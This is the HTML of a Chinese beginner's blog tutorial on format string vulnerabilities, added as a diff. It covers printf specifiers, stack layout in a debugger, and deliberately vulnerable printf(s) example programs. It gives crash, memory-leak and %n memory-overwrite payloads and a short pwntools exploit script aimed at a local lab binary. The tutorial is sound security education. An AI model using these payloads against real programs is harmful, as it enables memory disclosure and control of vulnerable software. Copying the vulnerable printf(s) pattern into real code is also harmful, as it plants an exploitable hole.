@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>格式化字符串漏洞 | coke_blog</title><meta name="keywords" content="漏洞原理"><meta name="author" content="coke_pwn"><meta name="copyright" content="coke_pwn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="格式化字符串漏洞初学pwn，学到了格式化字符串漏洞，总结一下。 格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。 漏洞printf（s） 用 printf() 为例，它的第一个参数就是格式化字符串 ：”Color %s,Number %d,Float %4.2f” 然后 printf 函数会根据这个格式化字符串来解析对应的其他参数  %d - 十进制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="http://example.com/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="coke_blog">
+<meta property="og:description" content="格式化字符串漏洞初学pwn，学到了格式化字符串漏洞，总结一下。 格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。 漏洞printf（s） 用 printf() 为例，它的第一个参数就是格式化字符串 ：”Color %s,Number %d,Float %4.2f” 然后 printf 函数会根据这个格式化字符串来解析对应的其他参数  %d - 十进制">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png">
+<meta property="article:published_time" content="2022-06-30T12:51:41.818Z">
+<meta property="article:modified_time" content="2022-06-30T13:02:27.482Z">
+<meta property="article:author" content="coke_pwn">
+<meta property="article:tag" content="漏洞原理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/06/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '格式化字符串漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-30 21:02:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2021/12/31/aSDZHoQfiWcINnA.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/04/27/Ta1xSMWdpXAREG4.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">coke_blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">格式化字符串漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-30T12:51:41.818Z" title="发表于 2022-06-30 20:51:41">2022-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-30T13:02:27.482Z" title="更新于 2022-06-30 21:02:27">2022-06-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="格式化字符串漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>初学pwn，学到了格式化字符串漏洞，总结一下。</p>
+<p><strong>格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。</strong></p>
+<p><strong>漏洞printf（s）</strong></p>
+<p>用 printf() 为例，它的第一个参数就是格式化字符串 ：”Color %s,Number %d,Float %4.2f”</p>
+<p>然后 printf 函数会根据这个格式化字符串来解析对应的其他参数</p>
+<blockquote>
+<p>%d - 十进制 - 输出十进制整数</p>
+<p>%s - 字符串 - 从内存中读取字符串</p>
+<p>%x - 十六进制 - 输出十六进制数</p>
+<p>%c - 字符 - 输出字符</p>
+<p>%p - 指针 - 指针地址</p>
+<p>%n - 到目前为止所写的字符数</p>
+<p>%hhn  -  写1字节</p>
+<p>%hn -  写2字节</p>
+<p>%ln  -  写4个字节</p>
+<p>%lln  -  写8字节</p>
+</blockquote>
+<h2 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h2><p>格式化字符串是由普通字符（包括%）和转换规则构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入到输出流中。</p>
+<p>转换规则由可选的部分和必选部分组成。其中只有转换指示符type是必选部分，用来表示转换类型。</p>
+<p>可选部分如下：</p>
+<ul>
+<li><p>可选部分的 <strong>parameter</strong>比较特殊，他是一个POSIX扩展，不属于C99，用于指定某个参数，例如**%2$d**，表示输出后面的第二个参数。</p>
+</li>
+<li><p>标志（flags）用来调整输出和打赢的符号，空白，小数点等。</p>
+</li>
+<li><p>宽度（width)用来指定输出字符的最小个数。</p>
+</li>
+<li><p>精度（.precision）用来指示打印符号个数，小数点位数或者有效数字个数。</p>
+</li>
+<li><p>长度(length)用来指定参数的大小。</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][width][.precision][length]type</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote>
+<p>格式化字符串漏洞从2000年左右开始流行起来，几乎在各种软件中都能见到它的身影，随着技术的发展，软件的安全性的提升，现在在PC段已经比较少见了，但是在物联网设备上依然层出不穷。2001年USENIX security会议上发表的文章为glibc提供了一个对抗格式化字符串漏洞的patch，通过静态分析检查参数个数与格式化字符串是否匹配。另一项安全机制FORTIFY_SOURCE也让该漏洞的利用更加困难。</p>
+</blockquote>
+<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>在X86结构下，格式化字符串的参数是通过栈传递的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s %d %s&quot;,&quot;hello World&quot;,233,&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.....................</span><br><span class="line"></span><br><span class="line">   0x565561f6 &lt;main+41&gt;    lea    edx, [eax - 0x1fce]</span><br><span class="line">   0x565561fc &lt;main+47&gt;    push   edx</span><br><span class="line">   0x565561fd &lt;main+48&gt;    lea    edx, [eax - 0x1fc2]</span><br><span class="line">   0x56556203 &lt;main+54&gt;    push   edx</span><br><span class="line">   0x56556204 &lt;main+55&gt;    mov    ebx, eax</span><br><span class="line"> ► 0x56556206 &lt;main+57&gt;    call   printf@plt                    &lt;printf@plt&gt;</span><br><span class="line">        format: 0x56557016 ◂— &#x27;%s %d %s&#x27;</span><br><span class="line">        vararg: 0x5655700a ◂— &#x27;hello World&#x27;</span><br><span class="line"> </span><br><span class="line">   0x5655620b &lt;main+62&gt;    add    esp, 0x10</span><br><span class="line">   0x5655620e &lt;main+65&gt;    nop    </span><br><span class="line">   0x5655620f &lt;main+66&gt;    lea    esp, [ebp - 8]</span><br><span class="line">   0x56556212 &lt;main+69&gt;    pop    ecx</span><br><span class="line">   0x56556213 &lt;main+70&gt;    pop    ebx</span><br><span class="line">   ..................</span><br><span class="line">00:0000│ esp 0xffffcf40 —▸ 0x56557016 ◂— &#x27;%s %d %s&#x27;</span><br><span class="line">01:0004│     0xffffcf44 —▸ 0x5655700a ◂— &#x27;hello World&#x27;</span><br><span class="line">02:0008│     0xffffcf48 ◂— 0xe9</span><br><span class="line">03:000c│     0xffffcf4c —▸ 0x56557008 ◂— 0x6568000a /* &#x27;\n&#x27; */</span><br><span class="line">04:0010│     0xffffcf50 —▸ 0xffffcf70 ◂— 0x1</span><br><span class="line">05:0014│     0xffffcf54 ◂— 0x0</span><br><span class="line">06:0018│ ebp 0xffffcf58 ◂— 0x0</span><br><span class="line">07:001c│     0xffffcf5c —▸ 0xf7ddfed5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据cdecl的调用约定，在进入printf函数之前，程序将参数从右到左依次压栈。进入printf（）之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是“%”，那么字符被直接复制到输出。否则，读取下一个非空字符，获取相应的参数并解析输出。</p>
+<p>接下来我们修改上面的程序，给格式化字符串加上“%x  %x %x %3$s”，使它出现格式化字符串漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">   0x565561f6 &lt;main+41&gt;    lea    edx, [eax - 0x1fce]</span><br><span class="line">   0x565561fc &lt;main+47&gt;    push   edx</span><br><span class="line">   0x565561fd &lt;main+48&gt;    lea    edx, [eax - 0x1fc2]</span><br><span class="line">   0x56556203 &lt;main+54&gt;    push   edx</span><br><span class="line">   0x56556204 &lt;main+55&gt;    mov    ebx, eax</span><br><span class="line"> ► 0x56556206 &lt;main+57&gt;    call   printf@plt                    &lt;printf@plt&gt;</span><br><span class="line">        format: 0x56557016 ◂— &#x27;%x %x %x %3$s&#x27;</span><br><span class="line">        vararg: 0x5655700a ◂— &#x27;hello World&#x27;</span><br><span class="line"> </span><br><span class="line">   0x5655620b &lt;main+62&gt;    add    esp, 0x10</span><br><span class="line">   0x5655620e &lt;main+65&gt;    nop    </span><br><span class="line">   0x5655620f &lt;main+66&gt;    lea    esp, [ebp - 8]</span><br><span class="line">   0x56556212 &lt;main+69&gt;    pop    ecx</span><br><span class="line">   0x56556213 &lt;main+70&gt;    pop    ebx</span><br><span class="line">─────────────────────────────────────────────</span><br><span class="line">   1 #include&lt;stdio.h&gt;</span><br><span class="line">   2 void main()</span><br><span class="line">   3 &#123;</span><br><span class="line"> ► 4 printf(&quot;%x %x %x %3$s&quot;,&quot;hello World&quot;,233,&quot;\n&quot;);</span><br><span class="line">   5 </span><br><span class="line">   6 &#125;</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffcf40 —▸ 0x56557016 ◂— &#x27;%x %x %x %3$s&#x27;</span><br><span class="line">01:0004│     0xffffcf44 —▸ 0x5655700a ◂— &#x27;hello World&#x27;</span><br><span class="line">02:0008│     0xffffcf48 ◂— 0xe9</span><br><span class="line">03:000c│     0xffffcf4c —▸ 0x56557008 ◂— 0x6568000a /* &#x27;\n&#x27; */</span><br><span class="line">04:0010│     0xffffcf50 —▸ 0xffffcf70 ◂— 0x1</span><br><span class="line">05:0014│     0xffffcf54 ◂— 0x0</span><br><span class="line">06:0018│ ebp 0xffffcf58 ◂— 0x0</span><br><span class="line">07:001c│     0xffffcf5c —▸ 0xf7ddfed5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>从反汇编代码来看没有任何区别。所以我们重点关注参数传递。程序打印出来了四个值，参数只有三个。</p>
+<p>如果我们将程序里面的格式化字符省略，转为由外部输入。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2</span> <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">3 </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(s);</span><br><span class="line"><span class="number">4</span>   <span class="built_in">printf</span>(s);</span><br><span class="line"><span class="number">5</span> </span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果大家都正常输入字符，程序不会有问题，但如果我们在s里面输入一些转换指示符。那么printf（）会把它当成格式化字符串解析，漏洞由此发生。</p>
+<p>格式化字符串漏洞的发生条件就是格式化字符串要求的参数和实际上提供的参数不匹配。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><blockquote>
+<p>对于格式化字符串漏洞的利用主要有：使程序崩溃，栈数据泄露，任意地址内存泄露，栈数据覆盖，任意地址内存覆盖。</p>
+</blockquote>
+<h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>这种攻击方法最简单，只需要输入一串 %s 就可以</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>
+
+<p>对于每一个 %s，printf() 都会从栈上取一个数字，把该数字视为地址，然后打印出该地址指向的内存内容，由于不可能获取的每一个数字都是地址，所以数字对应的内容可能不存在，或者这个地址是被保护的，那么便会使程序崩溃</p>
+<p><strong>在 Linux 中，存取无效的指针会引起进程收到 SIGSEGV （</strong>SIGSEGV分为SIG+SEGV。SIG是信号名的通用前缀；SEGV是segmentation violation（<strong>段违例</strong>）的缩写。）<strong>信号，从而使程序非正常终止并产生核心转储</strong>（产生错误报告）。</p>
+<h3 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h3><blockquote>
+<p> 通过%x将栈后面的参数给泄露出来。</p>
+</blockquote>
+<p>%x会在栈上找临近的一个参数，根据 格式化字符串 给打印出来，这样就把他后面一个栈上的值给输出出来了。</p>
+<p><strong>但是上面的都是获取临近的内容进行输出，我们不可能只要这几个东西，可以通过 %n$x 来获取被视作第 n+1 个参数的值（格式化字符串是第一个参数）.</strong></p>
+<p><strong>另外也可以通过 %s 来获取栈变量对应的字符串。</strong></p>
+<p>小技巧：</p>
+<blockquote>
+<p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别</p>
+<p>利用 %s 来获取变量所对应地址的内容，只不过有零截断</p>
+<p>利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容</p>
+</blockquote>
+<h3 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h3><p>攻击者使用类似于“%s”的格式规范就可以泄露出参数（指针指向内部存的数据），程序会将它作为一个ASCII字符串处理，直到遇到一个空字符。所以，如果攻击者能够操纵这个参数的值，那就可以泄露任意地址的内容。</p>
+<p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容 <code>addr%k$x</code></p>
+<p>下面就是确定格式化字符串是第几个参数了，一般可以通过 [tag]%p%p%p%p%p%p%p%p%p 来实现，如果输出的内容跟我们前面的 tag 重复了，那就说明我们找到了，但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试</p>
+<p>当然这也可以用 AAAA%4$p 来达到同样的效果，通过这种方法，如果我们传入的是 一个函数的 GOT 地址，那么他就可以给我们打印出来函数在内存中的真实地址</p>
+<p>使用 objdump -R fs1 查看一下 got 表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585295351751-a9f3d3b6-4eaa-4840-a392-ace6fddeaad0.png" alt="img"></p>
+<p><strong>%s 是把地址指向的内存内容给打印出来，可以把 函数的地址给打印出来。</strong></p>
+<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><p>%n，不输出字符，但是把已经成功输入的字符个数写入<strong>对应的整型指针参数所指的变量</strong>，只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值。</p>
+<p>一般来说，利用分为以下的步骤：</p>
+<ul>
+<li><p>确定覆盖地址</p>
+</li>
+<li><p>确定相对偏移</p>
+</li>
+<li><p>进行覆盖</p>
+</li>
+</ul>
+<p>源文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a= %p b=  %p c=  %p\n&quot;</span>,&amp;a ,&amp;b, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>关于覆盖偏移的话可以通过测试得出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://s2.loli.net/2022/06/30/IREsvpYlytdPLnc.png" alt="image-20220213113952399.png"></p>
+<p>可以看到格式化字符是第6个参数。</p>
+<p>那接下来，通过 %n 来进行覆盖，c_addr+%012d+%6$n</p>
+<p>c_addr 再加上 12 之后才能凑够 16，这样就可以把 c 改成 16。</p>
+<p><strong>%n可以将对应参数地址存储的值给改写。</strong></p>
+<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>如果想要将一个地方改为一个较小的数字，只需要 %n 是 数字 就可以了，如果想改成 2，可以用 aa%k$n，但是有个问题，之前我们是把地址放在前面，加上地址（4或8字节）之后就成了一个至少比 4 大的数</p>
+<p>aa%k$nxx，如果用这样的方式，前面 aa%k 是第六个参数，$nxx 是第七个参数，后面在跟一个 我们想要修改的地址，那么这个地址就是第八个参数，只需要把 k 改成 8 就可以把这第八个参数改成 2，aa%8$nxx。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里掌握的小技巧：没有必要把地址放在最前面，只需要找到它对应的偏移就可以。</p>
